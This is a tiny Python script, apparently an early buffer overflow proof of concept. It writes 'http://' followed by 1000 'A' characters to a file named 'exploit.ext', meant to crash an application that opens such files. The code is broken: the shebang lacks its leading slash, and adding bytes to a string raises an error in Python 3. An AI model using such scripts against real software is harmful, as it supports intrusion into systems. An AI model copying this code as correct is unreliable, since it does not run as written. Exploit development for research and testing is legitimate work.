#!usr/bin/python3

buffer = "http://"
buffer += b"A" * 1000

f=open("exploit.ext","w")
f.write(buffer)
f.close()